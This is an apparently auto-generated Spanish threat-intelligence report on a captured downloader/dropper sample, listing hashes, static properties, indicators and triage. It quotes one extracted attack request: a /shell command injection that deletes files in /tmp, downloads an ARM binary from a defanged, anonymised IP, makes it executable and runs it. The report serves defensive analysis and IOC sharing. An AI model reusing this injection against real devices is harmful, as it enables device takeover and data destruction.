# 🧬 Payload Analysis

`22dc7c044948730d0a3206ddd8a68af168349b0cd488c75fa2256c2fc5b68a56`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:38:23+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `22dc7c044948730d0a3206ddd8a68af168349b0cd488c75fa2256c2fc5b68a56`
- **SHA1:** `3cf23efdb587d74efc1a8546e2a478a1c2d97b74`
- **MD5:** `cb7896b4d6fd7570b27a8302673f1c34`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 276 B |
| Entropía | 5.36 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+-rf+*;wget+hxxp://176.65.149.XXX/bins/kaizen.arm;chmod+777+kaizen.arm;./kaizen.arm HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 176.65.149.XXX | static_analysis |
| url | hxxp://176.65.149.XXX/bins/kaizen.arm;chmod+777+kaizen.arm;./kaizen.arm | strings |
| hash | 22dc7c044948730d0a3206ddd8a68af168349b0cd488c75fa2256c2fc5b68a56 | static_analysis |
| command | GET /shell?cd+/tmp;rm+-rf+*;wget+hxxp://176.65.149.XXX/bins/kaizen.arm;chmod+777+kaizen.arm;./kaizen.arm HTTP/1.1 | strings |
| ip | 222.212.83.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
